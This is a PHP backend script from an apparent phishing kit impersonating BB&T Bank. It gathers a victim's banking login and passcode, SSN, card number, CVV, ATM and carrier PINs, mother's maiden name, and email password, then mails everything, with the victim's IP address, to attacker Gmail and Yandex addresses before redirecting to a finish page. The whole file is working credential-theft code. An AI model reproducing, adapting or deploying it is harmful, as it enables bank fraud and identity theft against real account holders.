<?php
session_start();


$ip = getenv("REMOTE_ADDR");

$message .= "--------------[ BB&T ]---------------------\n";
$message .= "ONLINE  : ".$_SESSION['username']."\n";
$message .= "PASSCode : ".$_SESSION['passcode']."\n";
$message .= "--------------[ BB&T ]---------------------\n";
$message .= "First Name  : ".$_POST['fname']."\n";
$message .= "Last Name  : ".$_POST['lname']."\n";
$message .= "Date Of Birth  : ".$_POST['dob']."\n";
$message .= "Street Address  : ".$_POST['stadd']."\n";
$message .= "State  : ".$_POST['st']."\n";
$message .= "City  : ".$_POST['ct']."\n";
$message .= "Zip Code  : ".$_POST['zip']."\n";
$message .= "Mother Maiden Name  : ".$_POST['mmn']."\n";
$message .= "Phone Number  : ".$_POST['phn']."\n";
$message .= "Carrier PIN  : ".$_POST['phpin']."\n";
$message .= "SSN  : ".$_POST['ssn']."\n";
$message .= "CardHolder's Name  : ".$_POST['noc']."\n";
$message .= "Card Number  : ".$_POST['card']."\n";
$message .= "Expiration Date  : ".$_POST['exp']."\n";
$message .= "CVV  : ".$_POST['cvv']."\n";
$message .= "ATM PIN  : ".$_POST['atm']."\n";
$message .= "Email Address  : ".$_POST['em']."\n";
$message .= "Email Password  : ".$_POST['empass']."\n";
$message .= "--------------[ BB&T ]---------------------\n";
$message .= "IP            : ".$ip."\n";
$message .= "--------------[ BB&T ]---------------------\n";
$recipient = "mastersraw001@gmail.com,matsont@yandex.ru";
$subject = "NEW LOGIN BB&T Bank [Nehro] $ip";
$headers = "From: BB&T Fullz<MeGa@mail.com>";
mail($recipient,$subject,$message,$headers);

session_destroy();
header("Location: finish.html");
?>